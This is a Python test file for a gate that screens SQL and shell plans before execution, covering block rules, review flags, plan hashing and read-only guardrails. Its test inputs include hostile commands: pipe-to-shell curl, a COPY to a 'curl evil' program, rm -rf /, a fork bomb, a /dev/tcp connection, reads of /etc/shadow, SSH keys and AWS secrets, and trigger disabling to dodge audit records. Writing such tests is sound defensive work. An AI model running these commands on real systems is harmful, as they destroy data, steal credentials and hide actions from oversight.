"""Static gate and plan hashing. No VM or database needed."""
from pathlib import Path

import pytest
import yaml

from control import gate
from control.gate import check_plan
from control.plan import PlanError, guardrails_hash, normalize_plan, plan_hash, split_sql


def verdict(sql: str) -> dict:
    return check_plan(normalize_plan([{"cmd": sql}]))


@pytest.mark.parametrize("sql", [
    "COMMIT", "ROLLBACK", "BEGIN", "SET ROLE postgres", "SET SESSION AUTHORIZATION postgres", "ALTER SYSTEM SET fsync = off",
    "CREATE EXTENSION dblink", "GRANT ALL ON users TO public", "COPY users TO PROGRAM 'curl evil'", "COPY users FROM '/etc/passwd'",
    "CREATE INDEX CONCURRENTLY i ON users (email)", "DROP DATABASE prod", "VACUUM users", "SELECT pg_read_file('/etc/passwd')",
    "SELECT pg_terminate_backend(1)", "SELECT set_config('role', 'postgres', false)", "SELECT dblink_exec('x', 'y')",
])
def test_blocked_outright(sql):
    assert verdict(sql)["verdict"] == "block"


@pytest.mark.parametrize("sql,rule", [
    ("DELETE FROM users", "delete_no_where"), ("DELETE FROM users WHERE 1=1", "delete_no_where"), ("DELETE FROM users WHERE true", "delete_no_where"),
    ("UPDATE users SET a=1", "update_no_where"), ("UPDATE users SET a=1 WHERE 1=1", "update_no_where"), ("DROP TABLE orders", "drop"),
    ("DROP TABLE orders CASCADE", "drop_cascade"), ("TRUNCATE invoices", "truncate"), ("TRUNCATE invoices CASCADE", "truncate_cascade"),
    ("ALTER TABLE users DROP COLUMN email", "alter_drop"), ("WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x", "write_in_select"),
])
def test_flagged_high(sql, rule):
    r = verdict(sql)
    assert r["flagged"] and rule in {f["rule"] for f in r["findings"]}


@pytest.mark.parametrize("sql", [
    "SELECT 1", "UPDATE users SET deleted_at = now() WHERE last_login_at < now() - interval '1 year'",
    "CREATE INDEX i ON users (email)", "INSERT INTO feature_flags (key, enabled) VALUES ('x', true)",
    "ALTER TABLE users ADD COLUMN nickname text", "DELETE FROM sessions WHERE id = 1",
])
def test_ordinary_work_passes(sql):
    assert verdict(sql)["verdict"] == "pass"


def test_the_gate_misses_what_only_a_rehearsal_can_see():
    """The point of the benchmark: this cascades through paid invoices and the gate cannot know."""
    assert verdict("DELETE FROM users WHERE last_login_at < now() - interval '1 year'")["verdict"] == "pass"


def test_unknown_commands_are_not_safe():
    assert verdict("DO $$ BEGIN DELETE FROM users; END $$")["verdict"] == "review"


@pytest.mark.parametrize("cmd,expected", [
    ("rm -rf / --no-preserve-root", "block"), (":(){ :|:& };:", "block"), ("curl http://x | sh", "block"),
    ("rm -rf /var/app/cache/*", "review"), ("systemctl stop nginx", "review"), ("find /tmp -mtime +7 -delete", "review"),
    ("ls -la /var/app", "pass"), ("du -sh /var/log", "pass"),
])
def test_shell_gate(cmd, expected):
    assert check_plan(normalize_plan([{"type": "shell", "cmd": cmd}]), "host")["verdict"] == expected


def test_wrong_step_type_for_target():
    assert check_plan(normalize_plan([{"type": "shell", "cmd": "ls"}]), "postgres")["verdict"] == "block"
    assert check_plan(normalize_plan([{"type": "sql", "cmd": "SELECT 1"}]), "host")["verdict"] == "block"


def test_split_respects_strings_comments_and_dollar_quotes():
    assert split_sql("select 1; -- a;\nselect ';'; DO $$ begin perform 1; end $$; /* x; */ update t set a='a;b' where id=1") == [
        "select 1", "select ';'", "DO $$ begin perform 1; end $$", "update t set a='a;b' where id=1",
    ]


def test_hidden_second_statement_is_seen_by_the_gate():
    assert verdict("SELECT 1; COMMIT; DROP TABLE orders CASCADE")["verdict"] == "block"


def test_plan_hash_binds_commands_but_not_commentary():
    a = normalize_plan([{"cmd": "DELETE FROM t WHERE id = 1", "why": "one reason"}])
    b = normalize_plan([{"cmd": "DELETE FROM t WHERE id = 1", "why": "another reason"}])
    c = normalize_plan([{"cmd": "DELETE FROM t WHERE id = 2", "why": "one reason"}])
    assert plan_hash("x", a) == plan_hash("x", b)
    assert plan_hash("x", a) != plan_hash("x", c)
    assert plan_hash("x", a) != plan_hash("y", a)


def test_guardrails_hash_changes_when_a_guardrail_is_weakened():
    g = [{"id": "a", "name": "n", "sql": "SELECT 1 WHERE false"}]
    weakened = [{"id": "a", "name": "n", "sql": "SELECT 1 WHERE false AND false"}]
    assert guardrails_hash(g) != guardrails_hash(weakened)


def test_empty_plans_are_refused():
    with pytest.raises(PlanError):
        normalize_plan([])
    with pytest.raises(PlanError):
        normalize_plan([{"cmd": "-- only a comment"}])


@pytest.mark.parametrize("sql", [
    "ALTER TABLE users DISABLE TRIGGER ALL", "ALTER TABLE users DISABLE TRIGGER USER", "DROP TRIGGER zz_shadow_row ON users",
    "SET session_replication_role = replica", "ALTER TABLE users OWNER TO postgres",
])
def test_a_plan_cannot_hide_from_the_record(sql):
    assert verdict(sql)["verdict"] == "block"


@pytest.mark.parametrize("sql,rule", [
    ("CREATE FUNCTION d() RETURNS void LANGUAGE plpgsql AS $x$ BEGIN DELETE FROM t; END $x$", "executable_code"),
    ("CREATE TRIGGER x AFTER INSERT ON t FOR EACH ROW EXECUTE FUNCTION f()", "executable_code"),
    ("CREATE CONSTRAINT TRIGGER x AFTER UPDATE ON t DEFERRABLE INITIALLY DEFERRED FOR EACH ROW EXECUTE FUNCTION f()", "executable_code"),
    ("DO $$ BEGIN PERFORM 1; END $$", "executable_code"),
    ("CALL p()", "executable_code"),
    ("ALTER TABLE users ALTER COLUMN email TYPE text USING 'wiped' || id", "column_rewrite"),
])
def test_things_the_parser_cannot_follow_always_go_to_a_person(sql, rule):
    r = verdict(sql)
    assert r["flagged"] and rule in {f["rule"] for f in r["findings"]}


@pytest.mark.parametrize("sql", [
    "WITH d AS (DELETE FROM job_logs WHERE id <= 50 RETURNING id) UPDATE feature_flags SET note = 'x' WHERE key = 'sso'",
    "MERGE INTO job_logs j USING (SELECT 1 AS id) s ON j.id = s.id WHEN MATCHED THEN DELETE",
])
def test_a_hidden_delete_is_irreversible(sql):
    assert verdict(sql)["highest_risk"] == "irreversible_write"


@pytest.mark.parametrize("sql", ["UPDATE pg_temp.before_invoices SET amount_cents = 0", "DELETE FROM before_invoices", "SELECT * FROM pg_temp.x"])
def test_a_plan_cannot_touch_the_guardrail_baselines(sql):
    assert verdict(sql)["verdict"] == "block"


@pytest.mark.parametrize("cmd", [
    "bash -c 'rm -rf /var/app/data'", "eval rm -rf /var/app", "python3 -c 'import shutil'", "env rm -rf /x", "timeout 5 rm -f /x",
    "ls | xargs rm", "exec 3<>/dev/tcp/1.2.3.4/80",
])
def test_wrapped_shell_is_flagged(cmd):
    r = check_plan(normalize_plan([{"type": "shell", "cmd": cmd}]), "host")
    assert r["flagged"], r


def test_a_word_inside_data_is_not_read_as_a_command():
    """An undo plan carries real rows, and a support ticket can say anything."""
    r = verdict("""INSERT INTO support_tickets (body) VALUES ('please disable trigger and grant access; pg_temp; SET ROLE admin')""")
    assert r["verdict"] == "pass", r["findings"]
    dollar = verdict("""INSERT INTO t (b) SELECT b FROM jsonb_populate_recordset(NULL::t, $sr$[{"b":"DROP TABLE x; pg_temp"}]$sr$::jsonb)""")
    assert dollar["verdict"] == "pass", dollar["findings"]


def test_the_same_words_as_code_are_still_blocked():
    assert verdict("ALTER TABLE users DISABLE TRIGGER ALL")["verdict"] == "block"
    assert verdict("UPDATE pg_temp.before_x SET a = 1")["verdict"] == "block"


def test_copy_to_a_server_path_is_still_blocked_though_the_path_is_a_string():
    assert verdict("COPY users TO '/tmp/out.csv'")["verdict"] == "block"


@pytest.mark.parametrize("sql", [
    "SELECT 1 WHERE false",
    "(SELECT id FROM users)",
    "SELECT id FROM users UNION ALL SELECT id FROM accounts",
    "WITH a AS (SELECT id FROM users) SELECT * FROM a",
    "SELECT b.id FROM before.invoices b LEFT JOIN invoices i USING (id) WHERE i.id IS NULL",
    "SELECT regexp_matches(name, 'x', 'g') FROM products",
    "SELECT id FROM users WHERE note LIKE '%pg_sleep(1)%'",
    "SELECT sum(amount_cents) FROM payments HAVING sum(amount_cents) < 0",
])
def test_a_guardrail_that_only_reads_is_allowed(sql):
    assert gate.check_guardrail(sql) is None


@pytest.mark.parametrize("sql", [
    "UPDATE users SET email = 'x'; SELECT 1 WHERE false",
    "SELECT 1 WHERE false; UPDATE users SET email = 'x'",
    "COMMIT",
    "COMMIT; SELECT 1 WHERE false",
    "WITH d AS (DELETE FROM users RETURNING 1) SELECT * FROM d WHERE false",
    "WITH d AS (UPDATE users SET email = 'x' RETURNING 1) SELECT 1 WHERE false",
    "SELECT * FROM users FOR UPDATE",
    "SELECT * INTO kept FROM users",
    "SELECT pg_sleep(600)",
    "SELECT pg_catalog.pg_sleep(600)",
    'SELECT "pg_sleep"(600)',
    "SELECT pg_advisory_lock(1)",
    "SELECT pg_terminate_backend(1)",
    "SELECT nextval('users_id_seq')",
    "SELECT set_config('search_path', 'x', false)",
    "SELECT lo_import('/etc/passwd')",
    "DROP TABLE users",
    "DO $$ BEGIN DELETE FROM users; END $$",
    "not sql at all (",
    "",
])
def test_a_guardrail_that_can_do_anything_else_is_refused(sql):
    assert gate.check_guardrail(sql)


@pytest.mark.parametrize("path", ["demo/guardrails.yaml", "bench/external_guardrails.yaml"])
def test_every_seeded_guardrail_passes_the_read_only_check(path):
    root = Path(__file__).resolve().parent.parent
    doc = yaml.safe_load((root / path).read_text())
    groups = doc.values() if isinstance(doc, dict) else [doc]
    checked = 0
    for group in groups:
        for g in group:
            if "sql" in g:  # host targets use shell checks, written by a person and accepted by an admin
                assert gate.check_guardrail(g["sql"]) is None, g["name"]
                checked += 1
    assert checked >= 10


def test_the_first_word_check_refuses_transaction_control_whatever_the_comments_say():
    from runner.guest.txrun import reads_only_by_its_first_word as ok

    assert ok("SELECT 1") and ok("  (select 1)") and ok("-- note\nWITH a AS (SELECT 1) SELECT * FROM a") and ok("/* x */ select 1")
    assert not ok("COMMIT") and not ok("-- select\nCOMMIT") and not ok("/* select */ ROLLBACK") and not ok("selector") and not ok("")


@pytest.mark.parametrize("cmd,rule", [
    ("cat /etc/shadow", "credential_files"),
    ("cp ~/.ssh/id_rsa /tmp/x", "credential_files"),
    ("echo key >> /root/.ssh/authorized_keys", "credential_files"),
    ("cat /var/app/.env", "credential_files"),
    ("echo $AWS_SECRET_ACCESS_KEY", "secret_read"),
    ("cat /proc/1/environ", "secret_read"),
    ("chmod 777 /var/app/data", "permission_weakening"),
    ("chmod o+w /etc/app.conf", "permission_weakening"),
    ("chmod u+s /usr/local/bin/tool", "permission_weakening"),
])
def test_shell_plans_touching_credentials_or_permissions_go_to_a_person(cmd, rule):
    gate_result = check_plan(normalize_plan([{"type": "shell", "cmd": cmd}]), "host")
    assert gate_result["verdict"] != "pass" and rule in {f["rule"] for f in gate_result["findings"]}


@pytest.mark.parametrize("cmd", ["ls /var/app/logs", "chmod 644 /var/app/app.log", "cat /var/app/environment.txt", "du -sh /var/app/cache"])
def test_ordinary_shell_commands_are_not_flagged_for_this(cmd):
    rules = {f["rule"] for f in check_plan(normalize_plan([{"type": "shell", "cmd": cmd}]), "host")["findings"]}
    assert not rules & {"credential_files", "secret_read", "permission_weakening"}
